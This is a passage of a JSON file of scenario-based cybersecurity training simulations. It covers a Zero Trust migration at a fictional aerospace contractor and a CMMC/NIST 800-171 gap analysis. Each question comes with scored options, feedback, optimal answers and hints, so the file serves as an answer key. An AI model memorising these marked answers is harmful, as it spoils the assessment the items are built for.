            "text": "A blame analysis identifying who was responsible for the certificate lapse",
            "feedback": "Blame-focused analysis creates a culture where people hide problems rather than report them. Blameless post-mortems that focus on systemic causes and improvements are far more effective at preventing future incidents.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Blameless post-mortem covering root causes, timeline, actions taken, and systemic improvements to prevent recurrence",
            "feedback": "Excellent. A blameless post-mortem focuses on: What happened (timeline), Why it happened (root causes), How we responded (actions and effectiveness), What we're changing (systemic improvements). This builds a learning culture and drives real improvement.",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "An executive summary for leadership highlighting the successful resolution",
            "feedback": "Executive communication is important but shouldn't be the primary documentation. Leadership needs a summary, but the organization needs detailed lessons learned and improvement tracking to prevent future incidents.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "text": "The goal of incident documentation is organizational learning and preventing recurrence.",
            "penalty": 2
          },
          {
            "level": 2,
            "text": "Blameless post-mortems focus on systemic causes and improvements, not individual fault.",
            "penalty": 5
          }
        ]
      }
    ],
    "glossary": {},
    "outcomes": {},
    "max_score": 250,
    "passing_score": 150
  },
  {
    "id": "D1-SIM-004",
    "title": "Zero Trust Migration",
    "domain": 1,
    "type": "SIM",
    "difficulty": "intermediate",
    "time_estimate": "35-45 minutes",
    "role": "security_engineer",
    "organization": {
      "name": "Stratos Aerospace",
      "industry": "Defense Contractor / Aerospace Manufacturing",
      "size": "3,200 employees across 4 facilities, plus 500 remote engineers"
    },
    "introduction": "Welcome to Zero Trust Migration. You will make critical security decisions.",
    "learning_objectives": [
      "1.2"
    ],
    "decision_points": [
      {
        "id": "D1S4-DP-001",
        "sequence": 1,
        "title": "Zero Trust Foundation",
        "situation": "Leadership has approved the Zero Trust initiative but wants to understand the fundamental shift in security philosophy. The CTO asks you to explain the core difference from their current model.\n\n**Question:** What is the FUNDAMENTAL difference between traditional perimeter security and Zero Trust?",
        "options": [
          {
            "id": "A",
            "text": "Zero Trust requires more firewalls and network security devices",
            "feedback": "Zero Trust isn't about adding more perimeter devices - it's a philosophical shift. Traditional security adds more walls; Zero Trust assumes walls are already breached and protects resources individually.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Traditional security trusts internal users by default; Zero Trust verifies every access request regardless of location",
            "feedback": "Exactly right. Traditional perimeter security operates on 'trust but verify' - once inside the network, users are trusted. Zero Trust operates on 'never trust, always verify' - every access request is authenticated and authorized regardless of whether it originates inside or outside the network.",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Zero Trust means removing all firewalls and letting identity be the only security control",
            "feedback": "This is a misconception. Zero Trust is additive - it adds identity-centric controls on top of existing security layers. Firewalls still provide value for network protection and segmentation. Zero Trust enhances, not replaces, defense in depth.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Zero Trust is primarily about implementing VPNs for all remote access",
            "feedback": "VPNs actually represent the old model - they grant broad network access once authenticated. Zero Trust often replaces VPNs with Zero Trust Network Access (ZTNA) that grants access to specific applications, not entire network segments.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "text": "Think about what happens AFTER a user authenticates in each model.",
            "penalty": 2
          },
          {
            "level": 2,
            "text": "Traditional: authenticate once, trusted thereafter. Zero Trust: verify continuously, trust nothing by default.",
            "penalty": 5
          }
        ]
      },
      {
        "id": "D1S4-DP-002",
        "sequence": 2,
        "title": "Implementation Starting Point",
        "situation": "With leadership aligned, you need to determine where to begin implementation. The organization has limited resources and needs quick wins while building toward full Zero Trust.\n\n**Question:** What should be the FIRST major Zero Trust implementation focus?",
        "options": [
          {
            "id": "A",
            "text": "Implement full microsegmentation across all network segments immediately",
            "feedback": "Full microsegmentation is important but attempting it first is extremely complex and disruptive. You need strong identity foundations before you can effectively enforce granular network policies. This approach often stalls due to scope and complexity.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Start with identity - implement strong authentication (MFA) and centralized identity management",
            "feedback": "Excellent. Identity is the foundation of Zero Trust. Before you can make access decisions based on user, device, and context, you need to reliably know WHO is requesting access. Strong authentication (MFA) and unified identity management enable all other Zero Trust controls.",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Deploy a Zero Trust Network Access (ZTNA) product to replace VPN",
            "feedback": "ZTNA is valuable but putting it before identity creates a weak foundation. ZTNA effectiveness depends on strong authentication and identity signals. Without solid identity, ZTNA can't make good access decisions.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Begin by encrypting all internal network traffic",
            "feedback": "Encrypting internal traffic (mutual TLS) is a Zero Trust principle, but it doesn't help with access control. Without strong identity and authorization, encrypted traffic from unauthorized users is still unauthorized - just encrypted. Identity comes first.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "text": "Zero Trust decisions are based on who, what, where, when. Which of these is most fundamental?",
            "penalty": 2
          },
          {
            "level": 2,
            "text": "Identity is the foundation. You can't verify users or make access decisions without reliable identity first.",
            "penalty": 5
          }
        ]
      },
      {
        "id": "D1S4-DP-003",
        "sequence": 3,
        "title": "Multi-Factor Authentication Strategy",
        "situation": "MFA deployment is approved. You need to select the authentication factors and methods for the organization. Security must be strong, but usability affects adoption.\n\n**Question:** What MFA strategy should you recommend for general workforce authentication?",
        "options": [
          {
            "id": "A",
            "text": "SMS-based one-time passwords as the second factor",
            "feedback": "SMS OTP is better than password-only but is considered weak MFA. SMS is vulnerable to SIM swapping, SS7 attacks, and social engineering. NIST and security frameworks recommend against SMS for high-security environments like defense contractors.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Phishing-resistant MFA: FIDO2 security keys for privileged users, authenticator apps with number matching for general users",
            "feedback": "Excellent tiered approach. FIDO2 security keys provide the strongest phishing resistance for high-value accounts. Authenticator apps with number matching (not just push approve) provide strong protection for general users while maintaining usability. This meets CMMC and EO 14028 requirements.",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Biometric authentication only - fingerprint or facial recognition on all devices",
            "feedback": "Biometrics alone (something you are) combined with password (something you know) is reasonable, but biometrics can be bypassed and can't be changed if compromised. A combination approach with hardware tokens provides stronger assurance. Also, not all devices support biometrics.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Email-based verification codes as the second factor",
            "feedback": "Email-based codes are weak MFA - if an attacker compromises email (common in phishing attacks), they get the MFA codes too. This creates circular dependency and doesn't meaningfully improve security over passwords alone.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "text": "Consider attack resistance - phishing is the most common credential theft method.",
            "penalty": 2
          },
          {
            "level": 2,
            "text": "FIDO2/WebAuthn security keys are phishing-resistant by design. Tiered approaches match security strength to risk level.",
            "penalty": 5
          }
        ]
      },
      {
        "id": "D1S4-DP-004",
        "sequence": 4,
        "title": "Device Trust Implementation",
        "situation": "With identity strengthened, you're implementing device trust - ensuring only compliant devices can access resources. The organization has a mix of corporate-managed and personal devices (BYOD for some roles).\n\n**Question:** How should device trust be implemented in this environment?",
        "options": [
          {
            "id": "A",
            "text": "Block all personal devices - only corporate-managed devices can access any resources",
            "feedback": "While simpler, completely blocking personal devices may not be practical for all roles and can hurt productivity. A risk-based approach that limits what BYOD can access while allowing managed devices full access is more balanced.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Allow any device that has current antivirus installed",
            "feedback": "Antivirus alone is insufficient for device trust. Device posture should include: OS version and patches, encryption status, management enrollment, security configuration, and more. Antivirus is just one factor.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Implement tiered access: managed devices with full compliance get full access; BYOD with basic checks get limited access to non-sensitive resources",
            "feedback": "Excellent. Tiered device trust aligns access with device assurance level. Managed devices meeting all compliance requirements (patched, encrypted, managed, healthy) access sensitive resources. BYOD meeting basic requirements (current OS, screen lock) access only low-sensitivity resources like email and general collaboration.",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Use network location as the primary trust signal - on-premise devices are trusted",
            "feedback": "This is the opposite of Zero Trust! Network location should not determine trust level. A compromised device on the corporate network is more dangerous than a healthy device remotely. Zero Trust evaluates device health regardless of location.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "text": "Consider how device trust level should affect what resources that device can access.",
            "penalty": 2
          },
          {
            "level": 2,
            "text": "Zero Trust matches access to risk. Higher device assurance = more sensitive resource access. Lower assurance = limited access.",
            "penalty": 5
          }
        ]
      },
      {
        "id": "D1S4-DP-005",
        "sequence": 5,
        "title": "Network Segmentation Strategy",
        "situation": "The network team is ready to begin segmentation. Currently, the network is relatively flat with broad VLAN access. You need to design the segmentation approach.\n\n**Question:** What segmentation strategy best aligns with Zero Trust for this defense contractor?",
        "options": [
          {
            "id": "A",
            "text": "Traditional VLAN segmentation by department: Engineering VLAN, Corporate VLAN, Manufacturing VLAN",
            "feedback": "Department-based VLANs are a start but still create large trust zones. The insider incident occurred because an engineer could access all engineering resources, not just their project. Zero Trust requires more granular segmentation based on data sensitivity and need-to-know.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Microsegmentation with application-level policies - each application/workload isolated with explicit allow rules",
            "feedback": "Excellent. Microsegmentation creates security boundaries around individual workloads or applications rather than network segments. Traffic is allowed only via explicit policies based on identity, device, and context. This prevents lateral movement even if one system is compromised.",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Air-gap all sensitive systems with no network connectivity",
            "feedback": "Air-gapping prevents all network-based attacks but severely impacts usability and collaboration. True air-gapping is reserved for the most sensitive classified systems. Most resources need some connectivity; Zero Trust provides protection while maintaining usability.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Segment only between classified and unclassified networks",
            "feedback": "Classification-based segmentation is necessary but insufficient. The insider incident occurred entirely within the unclassified network - commercial aviation vs. military drone documents. You need segmentation within classification levels based on project and need-to-know.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "text": "The insider moved laterally within the engineering department. Department-level segmentation wouldn't have helped.",
            "penalty": 2
          },
          {
            "level": 2,
            "text": "Microsegmentation creates boundaries around individual applications/workloads, enforcing explicit communication policies.",
            "penalty": 5
          }
        ]
      },
      {
        "id": "D1S4-DP-006",
        "sequence": 6,
        "title": "Continuous Verification Design",
        "situation": "Zero Trust requires continuous verification, not just point-in-time authentication. You're designing the ongoing verification mechanisms for established sessions.\n\n**Question:** How should continuous verification be implemented for active user sessions?",
        "options": [
          {
            "id": "A",
            "text": "Re-authenticate users every 15 minutes with full MFA",
            "feedback": "Constant re-authentication disrupts productivity without necessarily improving security. Continuous verification should be risk-based and adaptive, not just time-based. Forcing MFA every 15 minutes would make systems unusable.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Monitor user behavior (UEBA) and require step-up authentication when anomalies are detected",
            "feedback": "Excellent. User and Entity Behavior Analytics (UEBA) enables risk-adaptive verification. Normal behavior continues uninterrupted; anomalies (unusual access patterns, impossible travel, suspicious file access) trigger step-up authentication or access blocking. This balances security with usability.",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Extend session timeouts to 24 hours to reduce authentication friction",
            "feedback": "Long sessions without verification are the opposite of continuous verification. A 24-hour session means a compromised credential or stolen session can be used all day without challenge. This approach enables exactly the kind of prolonged unauthorized access seen in the incident.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Use only session cookies with standard timeout expiration",
            "feedback": "Standard session management is passive - it doesn't continuously evaluate risk. Once authenticated, the user is trusted until timeout regardless of what they do. This misses the 'assume breach' aspect of Zero Trust.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "text": "How could the 3-month insider activity have been detected earlier?",
            "penalty": 2
          },
          {
            "level": 2,
            "text": "Behavioral analytics detect anomalies - unusual access patterns, times, volumes. Risk-based step-up auth challenges suspicious behavior.",
            "penalty": 5
          }
        ]
      },
      {
        "id": "D1S4-DP-007",
        "sequence": 7,
        "title": "Least Privilege Access Design",
        "situation": "The current access model grants permissions based on department and job title. You're redesigning toward least privilege. Engineering file shares contain documents for dozens of different projects.\n\n**Question:** How should file share access be restructured for least privilege?",
        "options": [
          {
            "id": "A",
            "text": "All engineers get read access to all engineering files; write access requires manager approval",
            "feedback": "This is essentially the current model that enabled the insider incident. Read access to files outside one's project still allows data exfiltration. Least privilege means access only to resources needed for specific job duties, not broad department access.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Project-based access groups with automatic provisioning when assigned to a project and automatic removal when assignment ends",
            "feedback": "Excellent. Project-based access implements need-to-know: engineers access only their assigned projects. Automatic provisioning/deprovisioning through HR/project management integration ensures access stays current. This would have prevented the insider from accessing the drone program files.",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Require IT ticket for each individual file access request",
            "feedback": "Per-file ticketing creates massive administrative overhead and slows work to a crawl. Access should be role/project-based with self-service within appropriate boundaries. Security controls shouldn't make legitimate work impossible.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Senior engineers get full access; junior engineers get limited access based on tenure",
            "feedback": "Tenure-based access doesn't align with need-to-know. A senior engineer shouldn't access all projects just because they've been there longer. Least privilege is about job function and current assignments, not seniority or trust based on tenure.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "text": "What access did the insider legitimately need vs. what they actually had?",
            "penalty": 2
          },
          {
            "level": 2,
            "text": "Least privilege aligns access to job duties - in engineering, that means project assignments, not department membership.",
            "penalty": 5
          }
        ]
      },
      {
        "id": "D1S4-DP-008",
        "sequence": 8,
        "title": "Defense in Depth Integration",
        "situation": "A security architect asks how Zero Trust relates to the existing defense in depth strategy. Some team members think Zero Trust replaces defense in depth.\n\n**Question:** What is the relationship between Zero Trust and defense in depth?",
        "options": [
          {
            "id": "A",
            "text": "Zero Trust replaces defense in depth - multiple security layers are no longer needed when access is continuously verified",
            "feedback": "This is a dangerous misconception. Zero Trust does NOT eliminate the need for multiple security layers. If identity is compromised, you still want network controls, endpoint protection, and data-level security. Zero Trust enhances defense in depth by adding identity-centric controls.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Defense in depth becomes even more important - Zero Trust adds an identity-centric layer while maintaining network, endpoint, and data layers",
            "feedback": "Exactly right. Zero Trust adds identity as a primary control plane while keeping existing layers. The result is deeper defense: perimeter controls, network segmentation, identity verification, device health, application controls, and data protection all work together. No single layer failure compromises everything.",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Defense in depth and Zero Trust are competing philosophies - you must choose one approach",
            "feedback": "These are complementary, not competing. Defense in depth is about multiple layers; Zero Trust is about how those layers make decisions (based on identity and context rather than network location). They work together to strengthen overall security posture.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Zero Trust only applies to the network layer - other layers remain unchanged",
            "feedback": "Zero Trust applies across all layers: identity, device, network, application, and data. Each layer implements Zero Trust principles of verification and least privilege. It's not just a network architecture change.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "text": "What happens if the identity system is compromised? Do you want other protections in place?",
            "penalty": 2
          },
          {
            "level": 2,
            "text": "Zero Trust enhances defense in depth by adding identity-centric controls. Existing layers provide protection if any single component fails.",
            "penalty": 5
          }
        ]
      },
      {
        "id": "D1S4-DP-009",
        "sequence": 9,
        "title": "Assume Breach Preparation",
        "situation": "The 'assume breach' principle requires preparing for successful attacks, not just trying to prevent them. You need to design detection and response capabilities.\n\n**Question:** What capabilities best implement the 'assume breach' principle?",
        "options": [
          {
            "id": "A",
            "text": "Focus primarily on prevention - strong enough controls mean breaches won't happen",
            "feedback": "Prevention-only thinking is why breaches go undetected for months (like the insider incident - 90 days). Assume breach means accepting that prevention eventually fails and designing for rapid detection and response. Even the best controls have gaps.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Comprehensive logging with SIEM correlation, automated threat detection, incident response playbooks, and regular breach simulations",
            "feedback": "Excellent. Assume breach preparation means: visibility (comprehensive logging), detection (SIEM, analytics, threat intel), response capability (playbooks, trained team), and validation (red team exercises, breach simulations). This reduces dwell time and limits impact when breaches occur.",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Purchase cyber insurance to cover breach costs",
            "feedback": "Insurance transfers financial risk but doesn't detect, prevent, or respond to breaches. It's a business decision, not a security control. Assume breach is about operational preparation for incidents, not just financial preparation.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Implement data loss prevention (DLP) as the primary assume breach control",
            "feedback": "DLP is valuable for preventing data exfiltration, but assume breach is broader. You also need to detect unauthorized access, lateral movement, privilege escalation, and other attack behaviors - not just data leaving the network.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "text": "The insider operated for 90 days undetected. What was missing?",
            "penalty": 2
          },
          {
            "level": 2,
            "text": "Assume breach = visibility + detection + response capability + validation through exercises.",
            "penalty": 5
          }
        ]
      },
      {
        "id": "D1S4-DP-010",
        "sequence": 10,
        "title": "Zero Trust Maturity Assessment",
        "situation": "After six months of implementation, leadership wants a maturity assessment. You need to evaluate progress and identify the most critical gap for next-phase investment.\n\n**Question:** Based on the implementation so far, what should be the NEXT priority to advance Zero Trust maturity?",
        "options": [
          {
            "id": "A",
            "text": "Expand MFA to 100% of users before other improvements",
            "feedback": "MFA expansion is important, but you've already deployed strong MFA. The next maturity step should advance other pillars. Zero Trust maturity requires balanced advancement across identity, devices, network, applications, and data.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Implement data classification and protection - applying Zero Trust to the data layer",
            "feedback": "Excellent. With identity, device, and network controls progressing, the data layer is the critical gap. Data classification enables DLP, encryption decisions, and access policies based on data sensitivity. Ultimately, protecting data is the goal - other controls are means to that end.",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Replace all on-premise applications with cloud SaaS equivalents",
            "feedback": "Cloud migration isn't inherently a Zero Trust advancement. Cloud applications still need Zero Trust controls. The migration might be a business decision, but it's not automatically a security improvement. Focus on controls, not just platform.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Increase firewall rules and perimeter security investments",
            "feedback": "Reinforcing the perimeter contradicts Zero Trust principles. The whole point is that perimeter-focused security failed (the insider was inside the perimeter). Next investments should continue the Zero Trust journey, not revert to perimeter thinking.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "text": "What was actually stolen in the incident? What's the ultimate protection goal?",
            "penalty": 2
          },
          {
            "level": 2,
            "text": "Data is what attackers want. With identity, device, and network controls in place, protecting the data itself is the next critical layer.",
            "penalty": 5
          }
        ]
      }
    ],
    "glossary": {},
    "outcomes": {},
    "max_score": 250,
    "passing_score": 150
  },
  {
    "id": "D1-SIM-005",
    "title": "The Gap Analysis",
    "domain": 1,
    "type": "SIM",
    "difficulty": "advanced",
    "time_estimate": "40-50 minutes",
    "role": "grc_analyst",
    "organization": {
      "name": "Pinnacle Manufacturing",
      "industry": "Industrial Manufacturing / Defense Supply Chain",
      "size": "450 employees, 2 manufacturing plants, 1 corporate office"
    },
    "introduction": "Welcome to The Gap Analysis. You will make critical security decisions.",
    "learning_objectives": [
      "1.1",
      "1.3"
    ],
    "decision_points": [
      {
        "id": "D1S5-DP-001",
        "sequence": 1,
        "title": "Gap Analysis Approach",
        "situation": "You're beginning the gap analysis. The IT Director wants to jump straight to technical scanning, but you need to ensure a comprehensive approach.\n\n**Question:** What should be your approach to conducting this gap analysis?",
        "options": [
          {
            "id": "A",
            "text": "Start with comprehensive vulnerability scanning to identify technical gaps",
            "feedback": "Vulnerability scanning identifies technical weaknesses but doesn't assess policy, process, or procedural gaps. CMMC requires both technical controls AND documented policies/procedures. A scan-first approach misses critical governance gaps.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Interview key stakeholders and review documentation first, then validate with technical assessment",
            "feedback": "Excellent. A comprehensive gap analysis starts with understanding current state through interviews and document review (policies, procedures, configurations). Technical validation confirms what exists and identifies undocumented gaps. This addresses all three CMMC assessment objectives: policy, implementation, and documentation.",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Use an automated compliance assessment tool to check all 110 controls",
            "feedback": "Automated tools can help with technical controls but can't assess policy adequacy, procedural effectiveness, or personnel practices. Many NIST 800-171 controls require human judgment to assess. Tools are helpful but insufficient alone.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Focus only on the control families where you expect gaps based on the preliminary findings",
            "feedback": "A gap analysis must be comprehensive - all 110 controls must be assessed for CMMC certification. Focusing only on expected gaps may miss unexpected deficiencies. The C3PAO will assess everything, so you must too.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "text": "CMMC assesses three objectives: policies exist, controls are implemented, and both are documented.",
            "penalty": 2
          },
          {
            "level": 2,
            "text": "Start with people and documentation to understand intent and design, then validate with technical testing.",
            "penalty": 5
          }
        ]
      },
      {
        "id": "D1S5-DP-002",
        "sequence": 2,
        "title": "Control Framework Selection",
        "situation": "The CEO asks why you're assessing against NIST 800-171 specifically. They've heard of other frameworks like ISO 27001 and want to understand the choice.\n\n**Question:** How should you explain the framework selection for this assessment?",
        "options": [
          {
            "id": "A",
            "text": "NIST 800-171 is the best framework - always use it for any security assessment",
            "feedback": "No framework is universally 'best.' Framework selection depends on requirements: regulatory mandates, industry standards, customer requirements. NIST 800-171 is required here because CMMC is based on it, not because it's inherently superior.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "CMMC Level 2 is based on NIST 800-171 - assessing against it directly maps to your certification requirement",
            "feedback": "Exactly right. Framework selection should align with business requirements. CMMC Level 2's 110 practices come directly from NIST 800-171. Assessing against 800-171 provides direct mapping to CMMC requirements. Other frameworks might have overlapping controls but wouldn't directly satisfy the contract requirement.",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "ISO 27001 would be easier - suggest switching to that framework instead",
            "feedback": "ISO 27001 doesn't satisfy CMMC requirements. While there's overlap between frameworks, CMMC certification specifically requires NIST 800-171 controls. ISO 27001 certification wouldn't allow them to handle CUI or fulfill the defense contract.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Combine multiple frameworks - assess against NIST, ISO, and CIS Controls simultaneously",
            "feedback": "Multi-framework assessments have value but add complexity and cost. For this engagement, the requirement is specifically CMMC/NIST 800-171. Adding frameworks doesn't help achieve the immediate goal and stretches limited resources. Focus on what's required first.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "text": "What is driving this security initiative? What requirement must be satisfied?",
            "penalty": 2
          },
          {
            "level": 2,
            "text": "CMMC Level 2 practices are directly derived from NIST 800-171. The mapping is 1:1.",
            "penalty": 5
          }
        ]
      },
      {
        "id": "D1S5-DP-003",
        "sequence": 3,
        "title": "Gap Severity Classification",
        "situation": "After completing interviews and technical assessment, you have findings across all 14 control families. You need to classify gaps by severity to prioritize remediation. One finding: 'No MFA implemented for remote access.'\n\n**Question:** How should this MFA gap be classified?",
        "options": [
          {
            "id": "A",
            "text": "Low - MFA is a nice-to-have enhancement, basic password authentication exists",
            "feedback": "MFA is not optional for NIST 800-171 compliance. Control 3.5.3 requires multi-factor authentication for network access to privileged and non-privileged accounts. Without MFA, this control fails completely. This is a significant gap.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Medium - It's a compliance gap but can be addressed during normal IT upgrades",
            "feedback": "While this could be rolled into IT upgrades, classification should reflect compliance impact and risk, not remediation convenience. Remote access without MFA is a high-risk vulnerability and a clear compliance failure for multiple NIST 800-171 requirements.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "High - MFA is explicitly required by NIST 800-171, and remote access without MFA is high-risk for credential theft",
            "feedback": "Correct classification. MFA is explicitly required (3.5.3), remote access is a primary attack vector, and credential theft without MFA protection is highly likely given current threat landscape. This gap represents both compliance failure and significant security risk.",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Critical - Immediately shut down remote access until MFA is implemented",
            "feedback": "While the gap is serious, 'Critical' typically implies immediate threat or active exploitation. Shutting down remote access would severely impact operations. High severity with prioritized remediation is appropriate - urgent but not emergency shutdown.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "text": "Consider both compliance requirement (is it explicitly mandated?) and security risk (what's the threat exposure?).",
            "penalty": 2
          },
          {
            "level": 2,
            "text": "NIST 800-171 3.5.3 explicitly requires MFA. Remote access is frequently targeted by attackers.",
            "penalty": 5
          }
        ]
      },
      {
        "id": "D1S5-DP-004",
        "sequence": 4,
        "title": "Baseline Configuration Gap",
        "situation": "The assessment finds no documented baseline configurations for systems. Systems are configured inconsistently based on individual IT staff preferences.\n\n**Question:** What remediation approach should you recommend for the baseline configuration gap?",
        "options": [
          {
            "id": "A",
            "text": "Document the current configuration of each system as-is - that becomes the baseline",
            "feedback": "Documenting current state isn't creating a secure baseline - it's just recording potentially insecure configurations. Baselines should define the DESIRED secure state, not simply document the existing state which may include vulnerabilities.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Adopt industry-standard baselines (CIS Benchmarks, DISA STIGs) customized for business requirements, with documented exceptions",
            "feedback": "Excellent. Industry baselines provide tested, secure configurations aligned with compliance requirements. CIS Benchmarks and DISA STIGs are widely accepted and map to NIST controls. Customization acknowledges business needs while documented exceptions maintain compliance visibility.",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Create proprietary baseline documents from scratch specific to Pinnacle",
            "feedback": "Creating baselines from scratch is time-consuming and error-prone. Industry baselines represent collective expertise and are updated for new vulnerabilities. Custom baselines also face scrutiny from assessors who may question their adequacy. Start with industry standards.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Implement the most restrictive possible configuration on all systems for maximum security",
            "feedback": "Maximum restriction breaks functionality. Baselines must balance security with usability. Overly restrictive configurations cause workarounds that often create greater security risks. The goal is appropriate security, not maximum restriction.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "text": "Why create from scratch when proven, tested baselines exist?",
            "penalty": 2
          },
          {
            "level": 2,
            "text": "CIS Benchmarks and DISA STIGs are industry-accepted secure baselines that map to compliance frameworks.",
            "penalty": 5
          }
        ]
      },
      {
        "id": "D1S5-DP-005",
        "sequence": 5,
        "title": "Technical vs Administrative Control Balance",
        "situation": "Many gaps could be addressed with either technical controls or administrative controls (policies/procedures). Resources are limited. The IT Director prefers technical solutions; the CFO prefers policy solutions as they're cheaper.\n\n**Question:** How should you balance technical and administrative controls in the remediation plan?",
        "options": [
          {
            "id": "A",
            "text": "Prioritize technical controls - they're enforceable and harder to bypass than policies",
            "feedback": "Technical controls are often preferable but not always sufficient alone. NIST 800-171 requires documented policies AND implemented controls. Some requirements are inherently administrative (training, personnel screening). A balanced approach is needed.",
            "is_optimal": false,
            "points": 5,
